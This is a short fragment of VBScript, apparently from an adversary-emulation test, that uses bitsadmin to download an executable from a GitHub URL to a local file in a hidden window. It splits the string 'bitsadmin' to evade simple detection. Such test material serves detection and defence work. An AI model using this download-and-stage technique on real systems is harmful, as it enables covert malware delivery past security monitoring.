...
bitsadminReturn = shell.Run("bit"&"sadmin /transfer qcxjb" & Second(Now) & " /Priority HIGH " & "https://github.com/pmichaudrc/Reaction-Artifacts/raw/main/atomic-hello.exe " & localFile, 0, True)
